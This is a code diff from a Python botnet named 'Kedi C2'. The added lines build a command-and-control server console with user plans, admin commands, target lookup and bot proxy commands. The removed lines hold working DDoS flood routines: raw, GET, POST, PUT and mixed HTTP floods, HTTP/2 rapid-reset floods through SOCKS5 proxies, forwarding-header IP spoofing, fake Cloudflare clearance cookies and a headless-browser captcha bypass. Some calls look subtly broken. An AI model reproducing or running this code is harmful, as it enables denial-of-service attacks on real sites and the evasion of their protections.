+                                banr = f"""\r\t{LIGHTBLSYN}| {RESET}[{id}] {LIGHTGREEN}User {LIGHTRED}: {LIGHTPINK}{usr} {LIGHTRED}| {LIGHTGREEN}Method {LIGHTRED}: {LIGHTAQUA}{method} {LIGHTRED}| {LIGHTGREEN}Target {LIGHTRED}: {LIGHTYELLOW}{urll} | {LIGHTGREEN}Port {LIGHTRED}: {LIGHTWHITE}{prt} | {LIGHTGREEN}Time {LIGHTRED}: {LIGHTPURPLE}{timm} {LIGHTBLSYN}|"""
+                                conn.send(banr.encode())
+                        except:
+                            pass
+                    elif data.split()[0] == '.exit':
+                        conn.close()
+                        online_users.remove(conn)
+                        print(f"\n{red}[{yellow}+{red}] {green}Client {cyan}{addr} {green}disconnected {yellow}& {white}User {red}: {cyan}{user}")
+                    elif data.split()[0] == '.clear':
+                        conn.send("\033c".encode())
+                        print(f"\n  {red}[{yellow}+{red}] {green}Page Cleared {red}: {cyan}.clear {yellow}& {white}User {red}: {cyan}{user}")
+                        conn.send(f"\033]0; / Kedi C2 - Powerfull C2/Botnet - By Exploit - Bots : {len(kedis)} - User : {user} - Online : {len(online_users)} - Plan : {plan} - {datetime.now().date()} \\\007".encode())
+                    elif data.split()[0] == '.home':
+                        conn.send("\033c".encode())
+                        print(f"\n  {red}[{yellow}+{red}] {green}Backed to home page {red}: {cyan}.home {yellow}& {white}User {red}: {cyan}{user}")
+                        conn.send(banner_xd.encode())
+                        conn.send(f"\033]0; / Kedi C2 - Powerfull C2/Botnet - By Exploit - Bots : {len(kedis)} - User : {user} - Online : {len(online_users)} - Plan : {plan} - {datetime.now().date()} \\\007".encode())
+                    elif data.split()[0] == '.tools':
+                        conn.send(tools.encode())
+                        print(f"\n  {red}[{yellow}+{red}] {green}Tools Banner Sent Secessfull {yellow}& {white}User {red}: {cyan}{user}")
+                    elif data.split()[0] == '.bots':
+                        conn.send(bots.encode())
+                    elif data.split()[0] == '!methods':
+                        try:
+                            conn.send(methods.encode())
+                            print(f"\n  {red}[{yellow}+{red}] {green}Layer7 & Layer4 Banner Sent Secessful {yellow}& {white}User {red}: {cyan}{user}")
+                        except Exception as e:
+                            print(e)
+                    elif data.split()[0] == '\x00':
+                        conn.send(b'\x00')
+                    elif data.split()[0] == '!layer7':
+                        try:
+                            conn.send(layer7.encode())
+                            print(f"\n  {red}[{yellow}+{red}] {green}Layer7 Banner Sent Secessful {yellow}& {white}User {red}: {cyan}{user}")
+                        except Exception as e:
+                            print(e)
+                    elif data.split()[0] == '!layer4':
+                        conn.send(layer4.encode())
+                        print(f"\n  {red}[{yellow}+{red}] {green}Layer4 Banner Sent Secessful {yellow}& {white}User {red}: {cyan}{user}")
+                    elif data.split()[0] == '!base64-ecd':
+                        word = data.replace("!base64-ecd", "").strip()
+                        encoded_word = b64encode(word.encode('utf-8'))
+                        xd = encoded_word.decode('utf-8')
+                        bn = f"""
+                        \r{LIGHTYELLOW}     Encoded   {LIGHTRED}: {LIGHTGREEN}{xd}{RESET}\n
+"""
+                        conn.send(bn.encode())
+                    elif data.split()[0] == '!base64-dcd':
+                        word = data.replace("!base64-dcd", "").strip()  
+                        decoded_bytes = b64decode(word)
+                        xd = decoded_bytes.decode('utf-8')
+                        bn = f"""
+                        \r{LIGHTYELLOW}     Decoded   {LIGHTRED}: {LIGHTGREEN}{xd}{RESET}\n
+"""
+                    elif data.split()[0] == '.black':
+                        if plan == 'OWNER':
+                            uz = str(data.split()[1])
+                            with open('blacklist.txt' , 'a') as file:
+                                file.write(uz)
+                        conn.send(bn.encode())
+                    elif data.split()[0] == '.addproxy':
+                        if plan == 'OWNER':
+                            for kedi in kedis:
+                                kedi.send(b"!proxy")
+                            bn = f"""\r\n\t{LIGHTWHITE}[{LIGHTCYAN}#{LIGHTWHITE}] {LIGHTPURPLE}Proxy List Added {LIGHTGREEN}Secessful{RESET}\n
+"""
+                            conn.send(bn.encode())
+                    elif data.split()[0] == '[+]ping':
+                        conn.send(b'[+]pong')
+                    elif data.split()[0] == '.onlines':
+                        if plan == 'OWNER':
+                            online_usernames = get_online_users()
+                            print(online_usernames)
+                    elif data.split()[0] == '!print':
+                        try:
+                            notes = data.replace("!print", "").strip()  
+                            no_tes = text2Gen(notes)
+                            bn_r = f"""
+                        \r{RESET}     {LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTGREEN}Note   {LIGHTRED}: {LIGHTGREEN}{no_tes} {RESET}{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}]{RESET}\n
+ """
+                            conn.send(bn_r.encode())
+                        except Exception as e:
+                            print(e)
+                    elif data.split()[0] == '.paping':
+                        try:
+                            target_ip = str(data.split()[1])
+                            target_port = int(data.split()[2])
+                            print(f"\n  {red}[{yellow}+{red}] {green}Pinging {red}: {blue}{target_ip}:{target_port} {yellow}& {white}User {red}: {cyan}{user}")
+                            for _ in range(10):
+                                try:
+                                    start_time = time()
+                                    client_socket = socket(AF_INET , SOCK_STREAM)
+                                    client_socket.settimeout(5)
+                                    client_socket.connect((target_ip , target_port))
+                                    client_socket.close()
+                                    end_time = time()
+                                    response_time = (end_time - start_time) * 1000
+                                    theping = f"\r{LIGHTCYAN}Connected {LIGHTWHITE}to {LIGHTRED}{target_ip}{LIGHTWHITE}: time={LIGHTYELLOW}{response_time:.2f}ms{LIGHTWHITE} protocol={LIGHTGREEN}TCP{LIGHTWHITE} port={LIGHTMAGENTA}{target_port}\n"
+                                    conn.send(theping.encode())
+                                except socket.timeout:
+                                    timedout = f"\r{LIGHTRED}Connection timed out {LIGHTRED}{target_ip}{LIGHTWHITE}: time={LIGHTYELLOW}{response_time:.2f}ms{LIGHTWHITE} protocol={LIGHTGREEN}TCP{LIGHTWHITE} port={LIGHTMAGENTA}{target_port}\n"
+                                    conn.send(timedout.encode())
+                        except:
+                            pass
+                    elif data.split()[0] == '!t2u':
+                        bonnr = f"""
+\r\n\t{LIGHTRED}- {LIGHTGREEN}Enter Target {LIGHTPINK}& {LIGHTAQUA}Protocol {LIGHTRED}.
+\r\t{LIGHTRED}- {LIGHTGREEN}Example {LIGHTPURPLE}https {LIGHTRED}: !{LIGHTWHITE}t2u {LIGHTYELLOW}google.com https
+\r\t{LIGHTRED}- {LIGHTGREEN}Example {LIGHTPURPLE}http  {LIGHTRED}: !{LIGHTWHITE}t2u {LIGHTYELLOW}google.com http\n
+"""
+                        try:
+                            x_D = data.split()[1]
+                            ptcl = data.split()[2]
+                            if ptcl == 'https':
+                                conn.send(f"\r\n\t{LIGHTYELLOW}[{LIGHTRED}#{LIGHTYELLOW}] {LIGHTAQUA}Secessful | {LIGHTBLUE}https://{x_D}\n".encode())
+                            else:
+                                conn.send(f"\r\n\t{LIGHTYELLOW}[{LIGHTRED}#{LIGHTYELLOW}] {LIGHTAQUA}Secessful | {LIGHTBLUE}http://{x_D}\n".encode())
+                        except:
+                            conn.send(bonnr)
+                    elif data.split()[0] == '!u2t':
+                        bonnr = f"""
+\r\n\t{LIGHTRED}- {LIGHTGREEN}Enter URL {LIGHTRED}.
+\r\t{LIGHTRED}- {LIGHTGREEN}Example {LIGHTPURPLE}https {LIGHTRED}: !{LIGHTWHITE}t2u {LIGHTYELLOW}https://google.com
+\r\t{LIGHTRED}- {LIGHTGREEN}Example {LIGHTPURPLE}http  {LIGHTRED}: !{LIGHTWHITE}t2u {LIGHTYELLOW}http://google.com\n
+"""
+                        try:
+                            x_D = data.split()[1]
+                            parsed_url = urlparse(x_D)
+                            torgot = parsed_url.netloc
+                            conn.send(f"\r\n\t{LIGHTYELLOW}[{LIGHTRED}#{LIGHTYELLOW}] {LIGHTAQUA}Secessful | {LIGHTBLUE}{torgot}\n".encode())
+                        except:
+                            conn.send(bonnr)
+
+                    elif data.split()[0] == ".lookup":
+                        try:
+                            url = str(data.split()[1])
+                            parsed_url = urlparse(url)
+                            target = parsed_url.netloc
+                            now = datetime.now()
+                            current_datetime = datetime.now()
+                            date = current_datetime.date()
+                            timee = now.strftime('%H:%M:%S')
+                            response = get(f"http://ip-api.com/json/{target}")
+                            response.raise_for_status()
+                            dat = response.json()
+                            isp = dat['as']
+                            city = dat['city']
+                            zone = dat['timezone']
+                            isp_banner = f"""
+                        \r    {LIGHTCYAN}╔══════════════════════════════════════════════════════════════════╗
+                        \r    {LIGHTYELLOW} Date   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{date}{LIGHTYELLOW} ]
+                        \r    {LIGHTYELLOW} Time   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{timee}{LIGHTYELLOW} ]
+                        \r    {LIGHTYELLOW} Isp    {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{isp}{LIGHTYELLOW} ]
+                        \r    {LIGHTYELLOW} Zone   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{zone}{LIGHTYELLOW} ]
+                        \r    {LIGHTYELLOW} City   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{city}{LIGHTYELLOW} ]
+                        \r    {LIGHTYELLOW} Tool   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTRED}Kedi{LIGHTGREEN}-{LIGHTCYAN}C2{LIGHTYELLOW} ]
+                        \r    {LIGHTCYAN}╚══════════════════════════════════════════════════════════════════╝\n
+                        """
+                            conn.send(isp_banner.encode())
+                            print(f"\n  {red}[{yellow}+{red}] {green}Lookup {red}: {blue}{url} {yellow}& {white}User {red}: {cyan}{user}")
+                        except:
+                            pass
+                    elif data.split()[0] == "!help":
+                        conn.send(help.encode())
+                        print(f"\n  {red}[{yellow}+{red}] {green}Help Banner Sent Secessful {yellow}& {white}User {red}: {cyan}{user}")
+                    elif data.split()[0] == "help":
+                        conn.send(help.encode())
+                        print(f"\n  {red}[{yellow}+{red}] {green}Help Banner Sent Secessful {yellow}& {white}User {red}: {cyan}{user}")
+                    elif data.split()[0] == "admin":
+                        if plan == 'OWNER':
+                            conn.send(help_admin.encode())
+                            print(f"\n  {red}[{yellow}+{red}] {green}Admin Help Banner Sent Secessful {yellow}& {white}User {red}: {cyan}{user}")
+                    elif data.split()[0] == ".admin":
+                        if plan == 'OWNER':
+                            conn.send(help_admin.encode())
+                            print(f"\n  {red}[{yellow}+{red}] {green}Admin Help Banner Sent Secessful {yellow}& {white}User {red}: {cyan}{user}")
+                    elif data.split()[0] == "helpme":
+                        if plan == 'OWNER':
+                            conn.send(help_admin.encode())
+                            print(f"\n  {red}[{yellow}+{red}] {green}Admin Help Banner Sent Secessful {yellow}& {white}User {red}: {cyan}{user}")
+                    elif data.split()[0] == ".helpme":
+                        if plan == 'OWNER':
+                            conn.send(help_admin.encode())
+                            print(f"\n  {red}[{yellow}+{red}] {green}Admin Help Banner Sent Secessful {yellow}& {white}User {red}: {cyan}{user}")
+                    elif data.split()[0] == '.adduser':
+                        if plan == 'OWNER':
+                            parts = data.split()
+                            if len(parts) != 4:
+                                conn.send(f"\r\n\t{LIGHTRED}[ERROR]{LIGHTCYAN} Usage: .adduser <username> <password> <plan>\n".encode())
+                            else:
+                                uname = parts[1]
+                                pword = parts[2]
+                                pla = parts[3]
+                                user_json = {
+                                    uname: {
+                                        "user": uname,
+                                        "password": pword,
+                                        "plan": pla
+                                    }
+                                }
+                                urs = load_files()
+                                if any(details["user"] == uname for details in urs.values()):
+                                    conn.send(f"\r\n\t{LIGHTRED}[ERROR]{LIGHTCYAN} User {uname} already exists.\n".encode())
+                                else:
+                                    new_key = str(len(urs) + 1)
+                                    urs[new_key] = user_json[uname]
+                                    save_files(urs)
+                                    conn.send(f"\r\n\t{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTGREEN}New User Added Successfully: {uname}:{pword}:{pla}\n".encode())
+                    elif data.split()[0] == '.deluser':
+                        if plan == 'OWNER':
+                            try:
+                                uname = data.split()[1]
+                                fpath = 'src/users.json'
+                                users = load_files('src/users.json')
+                                key_to_delete = None
+                                for key , details in users.items():
+                                    if details.get("user") == uname:
+                                        key_to_delete = key
+                                        break
+                                if key_to_delete:
+                                    del users[key_to_delete]
+                                    save_files(users , fpath)
+                                conn.send(f"\r\n\t{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTGREEN}User Deleted Successfully\n".encode())
+                            except:
+                                pass
+                        else:
+                            conn.send(f"\r\n\t{LIGHTRED}[ERROR]{LIGHTCYAN} Permission Denied: Only root can add users.\n".encode())
+                    elif data.split()[0] == '.banuser':
+                        if plan == 'OWNER':
+                            try:
+                                uname = data.split()[1]
+                                ban_file = "src/ban.json"
+                                banned_users = load_files(ban_file)
+                                if isinstance(banned_users , dict):
+                                    banned_users = list(banned_users.values())
+                                if uname in banned_users:
+                                    conn.send(f"\r\n\t{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTGREEN}Already Banned\n".encode())
+                                else:
+                                    banned_users.append(uname)
+                                    save_files(banned_users, ban_file)
+                                conn.send(f"\r\n\t{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTGREEN}Banned Successfully\n".encode())
+                            except Exception as e:
+                                print(e)
+                    elif data.split()[0] == '.unban':
+                        if plan == 'OWNER':
+                            try:
+                                uname = data.split()[1]
+                                ban_file = 'src/ban.json'
+                                banned_users = load_files(ban_file)
+                                users = load_files('src/ban.json')
+                                if isinstance(banned_users, dict):
+                                    banned_users = list(banned_users.values())
+                                if uname in banned_users:
+                                    banned_users.remove(uname)
+                                    save_files(banned_users, ban_file)
+                                conn.send(f"\r\n\t{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTGREEN}User Unbanned Successfully\n".encode())
+                            except:
+                                pass
+                    elif data.split()[0] == '!passwd':
+                        users = load_files('src/users.json')
+                        new_passwd = data.split()[1]
+                        for user_id, details in usr.items():
+                            if details.get('user') == user:
+                                details['password'] = new_passwd
+                                save_files(details , fpath)
+
+                except:
+                    pass
+        except Exception as e:
+            print(f"{red}[{yellow}+{red}] {green}Error with client {cyan}{addr} {red}: {cyan}{e}")
         finally:
-            if s:
-                try:
-                    s.close()
-                except:
-                    pass
-            connected = False
-            sleep(5)
-        try:
-            us = UserAgent()
-            ua = us.random
-            ctx = create_default_context(cafile=where())
-            ctx.check_hostname = False
-            ctx.verify_mode = CERT_NONE
-            parsed_url = urlparse(url)
-            target = parsed_url.netloc
-            path = parsed_url.path
-            if path == "":
-                path = "/"
-            def generate_fake_phpsessid(length):
-                characters = ascii_letters + digits
-                fake_phpsessid = ''.join(che(characters) for _ in range(length))
-                return fake_phpsessid
-            fake_cookie_phpsessid = generate_fake_phpsessid(147)
-            fake_cookie_phpsessidd = generate_fake_phpsessid(32)
-            response = get(url)
-            cookie = response.cookies
-            if cookie == '':
-                cookie = ("cf_clearance="+fake_cookie_phpsessid, "PHPSSID="+fake_cookie_phpsessidd)
-        except:
-            pass
+            conn.close()
+            online_users.remove(conn)
+            print(f"\n{red}[{yellow}+{red}] {green}Client {cyan}{addr} {green}disconnected {white}User {red}: {cyan}{user}")
+    except:
+        pass
 
-            def raw():
-                while time() < timer:
-                    try:
-                        if url.split('://')[0] == 'https':
-                            s = socket(AF_INET , SOCK_STREAM)
-                            s = ctx.wrap_socket(s, server_hostname=target)
-                            s.connect((target,port))
-                        else:
-                            s = socket(AF_INET , SOCK_STREAM)
-                            s.connect((target,port))
-                        for _ in range(rpc):
-                            payl = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n".encode()
-                            s.send(payl)
-                    except:
-                        pass
-                    
-            def get():
-                while time() < timer:
-                    try:
-                        if url.split('://')[0] == 'https':
-                            s = socket(AF_INET , SOCK_STREAM)
-                            s = ctx.wrap_socket(s, server_hostname=target)
-                            s.connect((target,port))
-                        else:
-                            s = socket(AF_INET , SOCK_STREAM)
-                            s.connect((target,port))
-                        for _ in range(rpc):
-                            payl = f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nDNT: 1\r\nReferer: {che(reff)}\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()
-                            s.send(payl)
-                    except:
-                        pass
-
-            def rapid():
-                while time() < timer:
-                    try:
-                        if url.split('://')[0] == 'https':
-                            sok5 = open('theprxy.txt' , 'r').read().split()
-                            s = socksocket()
-                            s = socket.create_connection(target , port)
-                            pri = che(sok5).split(':');
-                            s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
-                            s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
-                            encrypted_data = b64encode("GET {TARGET} HTTP/2".encode()).decode()
-                            conn = H2Connection()
-                            conn.initiate_connection()
-                            s = ctx.wrap_socket(s , server_hostname=target)
-                            s.connect((target , port))
-                        else:
-                            s = socksocket()
-                            pri = che(sok5).split(':');
-                            s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
-                            s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
-                            encrypted_data = b64encode("GET {TARGET} HTTP/2".encode()).decode()
-                            conn = H2Connection()
-                            conn.initiate_connection()
-                            s.connect((target , port))
-                        for _ in range(rpc):
-                            iur = "https" if url.split('://')[0] == "https" else "http"
-                            payl = {
-                                ":method": "GET",
-                                ":path": path,
-                                ":scheme": iur,
-                                ":authority": target,
-                                "user-agent": ua,
-                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                                "accept-encoding": "gzip, deflate, br",
-                                "connection": "keep-alive",
-                                "encrypted-data": encrypted_data
-                            }
-                            stream_id = conn.get_next_available_stream_id()
-                            conn.send_headers(stream_id , payl)
-                            s.send(conn.data_to_send())
-                            conn.reset_stream(stream_id)
-                            s.send(conn.data_to_send())
-                            s.close()
-                    except:
-                        pass 
-
-            def spoof():
-                while time() < timer:
-                    try:
-                        if url.split('://')[0] == 'https':
-                            s = socket(AF_INET , SOCK_STREAM)
-                            s = ctx.wrap_socket(s, server_hostname=target)
-                            s.connect((target,port))
-                        else:
-                            s = socket(AF_INET , SOCK_STREAM)
-                            s.connect((target,port))
-                        for _ in range(rpc):
-                            ipt = spo_ip()
-                            payl = f'GET {path}?{strm(6)}={strm(6)}={strm(6)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nX-Originating-IP: {ipt}\r\nX-Forwarded-For: {ipt}\r\nX-Forwarded: {ipt}\r\nForwarded-For: {ipt}\r\nX-Forwarded-Host: {ipt}\r\nX-Remote-IP: {ipt}\r\nX-Remote-Addr: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nX-Original-URL: {ipt}\r\nClient-IP: {ipt}\r\nX-Client-IP: {ipt}\r\nTrue-Client-IP: {ipt}\r\nX-Host: {ipt}\r\nCluster-Client-IP: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nVia: 1.0 fred, 1.1 {ipt}\r\n\r\n'.encode()
-                            s.send(payl)
-                    except:
-                        pass
-
-            def post():
-                while time() < timer:
-                    try:
-                        if url.split('://')[0] == 'https':
-                            s = socket(AF_INET , SOCK_STREAM)
-                            s = ctx.wrap_socket(s, server_hostname=target)
-                            s.connect((target,port))
-                        else:
-                            s = socket(AF_INET , SOCK_STREAM)
-                            s.connect((target,port))
-                        for _ in range(rpc):
-                            payl = f'POST {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nReferer: {che(reff)}\r\nContent-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n\r\n'.encode()
-                            s.send(payl)
-                    except:
-                        pass
-
-            def bypass():
-                while time() < timer:
-                    try:
-                        if url.split('://')[0] == 'https':
-                            s = socket(AF_INET , SOCK_STREAM)
-                            s = ctx.wrap_socket(s, server_hostname=target)
-                            s.connect((target,port))
-                        else:
-                            s = socket(AF_INET , SOCK_STREAM)
-                            s.connect((target,port))
-                        for _ in range(rpc):
-                            payl = f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Cotrol: max-age=0\r\nConnection: keep-alive\r\nDNT: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode()
-                            s.send(payl)
-                    except:
-                        pass
-
-            def browser():
-                chrome_options = Options()
-                user_agent = UserAgent()
-                options = Options()
-                options.add_argument("--disable-features=Translate,OptimizationHints,MediaRouter")
-                options.add_argument("--disable-extensions")
-                options.add_argument("--disable-component-extensions-with-background-pages")
-                options.add_argument("--disable-background-networking")
-                options.add_argument("--disable-component-update")
-                options.add_argument("--disable-client-side-phishing-detection")
-                options.add_argument("--disable-sync")
-                options.add_argument("--metrics-recording-only")
-                options.add_argument("--disable-default-apps")
-                options.add_argument("--mute-audio")
-                options.add_argument("--no-default-browser-check")
-                options.add_argument("--no-first-run")
-                options.add_argument("--disable-backgrounding-occluded-windows")
-                options.add_argument("--disable-renderer-backgrounding")
-                options.add_argument("--disable-background-timer-throttling")
-                options.add_argument("--disable-ipc-flooding-protection")
-                options.add_argument("--password-store=basic")
-                options.add_argument("--use-mock-keychain")
-                options.add_argument("--force-fieldtrials=*BackgroundTracing/default/")
-                options.add_argument("--allow-pre-commit-input")
-                options.add_argument("--disable-breakpad")
-                options.add_argument("--disable-dev-shm-usage")
-                options.add_argument("--disable-hang-monitor")
-                options.add_argument("--disable-popup-blocking")
-                options.add_argument("--disable-prompt-on-repost")
-                options.add_argument("--disable-search-engine-choice-screen")
-                options.add_argument("--enable-blink-features=IdleDetection")
-                options.add_argument("--enable-features=NetworkServiceInProcess2")
-                options.add_argument("--export-tagged-pdf")
-                options.add_argument("--force-color-profile=srgb")
-                options.add_argument("--disable-features=Translate,AcceptCHFrame,MediaRouter,OptimizationHints")
-                options.add_argument("--test-type")
-                options.add_argument("--renderer-process-limit=1")
-                options.add_argument("--in-process-gpu")
-                options.add_argument("--disable-gpu")
-                options.add_argument("--disable-setuid-sandbox")
-                options.add_argument("--no-zygote")
-                options.add_argument("--no-sandbox")
-                options.add_argument("--headless=new")
-                options.add_argument("--user-agent=" + user_agent)
-                service = Service()
-                driver = webdriver.Chrome(service=service , options=chrome_options)
-                driver.get(url)
-                sleep(5)
-                try:
-                    captcha_element = driver.find_element(By.ID , "captcha")
-                    captcha_element.click()
-                    driver.execute_script(f"window.open('{url}', '_blank');")
-                    sleep(30)
-                    driver.switch_to.window(
-                        window_name=driver.window_handles[0]
-                    )
-                    driver.close()
-                    driver.switch_to.window(
-                        window_name=driver.window_handles[0]
-                    )
-                    source = driver.page_source
-                    if "access denied" in driver.title.lower():
-                        driver.quit()
-                    if "challenge-platform" in source:
-                        CLOUDFLARE_CAPTCHA_SELECTOR = "iframe[src*='challenges']"
-                        CLOUDFLARE_CHECKBOX_SELECTOR = "input[type='checkbox']"
-                        wait_for_selector_visible(driver=driver, selector=CLOUDFLARE_CAPTCHA_SELECTOR, timeout=30)
-                        captcha_box = driver.find_element("css selector", CLOUDFLARE_CAPTCHA_SELECTOR)
-                        driver.switch_to.frame(captcha_box)
-                        sleep(12)
-                        captcha_checkbox = driver.find_element("css selector", CLOUDFLARE_CHECKBOX_SELECTOR)
-                        actions = ActionChains(driver=driver)
-                        actions.click(captcha_checkbox)
-                        actions.perform()
-                        driver.switch_to.default_content()
-                        wait_for_navigate(driver=driver)
-                        sleep(12)
-                except:
-                    pass
-                sleep(9)
-                driver.quit()
-                return driver
-            
-            def put():
-                while time() < timer:
-                    try:
-                        if url.split('://')[0] == 'https':
-                            s = socket(AF_INET , SOCK_STREAM)
-                            s = ctx.wrap_socket(s, server_hostname=target)
-                            s.connect((target,port))
-                        else:
-                            s = socket(AF_INET , SOCK_STREAM)
-                            s.connect((target,port))
-                        for _ in range(rpc):
-                            payl = f"PUT {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n".encode()
-                            s.send(payl)
-                    except:
-                        pass
-
-            def http_mix():
-                while True:
-                    try:
-                        if url.split('://') == 'https':
-                            s = socket(AF_INET , SOCK_STREAM)
-                            s = ctx.wrap_socket(s , server_hostname=target)
-                            s.connect((target , port))
-                        else:
-                            s = socket(AF_INET , SOCK_STREAM)
-                            s.connect((target , port))
-                        for _ in range(rpc):
-                            payl1 = f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nReferer: {url}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'.encode()
-                            payl2 = f'POST {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nReferer: {url}\r\nContent-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n\r\n'.encode()
-                            payl3 = f'HEAD {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n'.encode()
-                            payl4 = f"PUT {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n".encode()
-                            s.sendall(payl1 , payl2 , payl3 , payl4)
-                            s.send(payl2)
-                            s.send(payl3)
-                            s.send(payl4)
-                    except:
-                        pass
-
-            def http():
-                while time() < timer:
-                    try:
-                        s = socket(AF_INET , SOCK_STREAM)
-                        s.connect((target,port))
-                        for _ in range(rpc):
-                            payl = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n".encode()
-                            s.send(payl)
-                    except:
-                        pass
-
-            def xmlrpc():
-                while time() < timer:
-                    try:
-                        if url.split('://')[0] == 'https':
-                            s = socket(AF_INET , SOCK_STREAM)
-                            s = ctx.wrap_socket(s , server_hostname=target)
-                            s.connect((target , port))
-                        else:
-                            s = socket(AF_INET , SOCK_STREAM)
-                            s.connect((target , port))
-                        for _ in range(rpc):
-                            payl = f'POST {path} HTTP/1.1\r\nHost: {target}\r\nContent-Length: 131\r\n<?xml version="1.0" encoding="utf-8"?>\r\n<methodCall>\r\n<methodName>system.listMethods</methodName>\r\n<params></params>\r\n</methodCall>\r\n\r\n'.encode()
-                            s.send(payl)
-                    except:
-                        pass
-
-            def https():
-                while time() < timer:
-                    try:
-                        if url.split('://')[0] == 'https':
-                            sok5 = open('theprxy.txt' , 'r').read().split()
-                            s = socksocket()
-                            s = socket.create_connection(target , port)
-                            pri = che(sok5).split(':');
-                            s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
-                            s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
-                            encrypted_data = b64encode("GET {TARGET} HTTP/2".encode()).decode()
-                            conn = H2Connection()
-                            conn.initiate_connection()
-                            s = ctx.wrap_socket(s , server_hostname=target)
-                            s.connect((target , port))
-                        else:
-                            s = socksocket()
-                            pri = che(sok5).split(':');
-                            s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
-                            s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
-                            encrypted_data = b64encode("GET {TARGET} HTTP/2".encode()).decode()
-                            conn = H2Connection()
-                            conn.initiate_connection()
-                            s.connect((target , port))
-                        for _ in range(rpc):
-                            iur = "https" if url.split('://')[0] == "https" else "http"
-                            payl = {
-                                ":method": "GET",
-                                ":path": path,
-                                ":scheme": iur,
-                                ":authority": target,
-                                "user-agent": ua,
